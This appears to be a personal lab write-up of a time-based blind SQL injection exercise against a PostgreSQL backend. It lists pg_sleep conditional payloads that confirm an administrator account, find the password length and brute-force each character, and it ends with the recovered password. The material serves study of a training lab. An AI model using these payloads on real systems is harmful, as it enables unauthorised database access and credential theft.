---
tags:
  - sqli
  - blind
  - time-delay
  - retrieval
---

# Blind SQL injection with time delays and information retrieval

1. Send the following payload and observe that it takes about 10 seconds to respond

```
Z'%3bSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

2. Now change the condition to confirm the existence of an administrative user

```
Z'%3bSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
```

3. Determine the length of the password with this payload. Note that the password is 20 chars long

```
Z'%3bSELECT CASE WHEN (username='administrator' and length(password)>19) THEN pg_sleep(5) ELSE pg_sleep(0) END from users--
```

![[attachments/sqli-lab-15/file-20260204140228775.png]]

4. Change the payload to find the first character of the admin password

```
Z'%3bSELECT CASE WHEN (username='administrator' and substring(password,1,1)='k') THEN pg_sleep(5) ELSE pg_sleep(0) END from users--
```

![[attachments/sqli-lab-15/file-20260204140441577.png]]

5. Now change the placeholders and change to cluster bomb mode to find the full admin password

```
Z'%3bSELECT CASE WHEN (username='administrator' and substring(password,4,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END from users--
```

```
kxxa00hkwszavix3h7z6
```

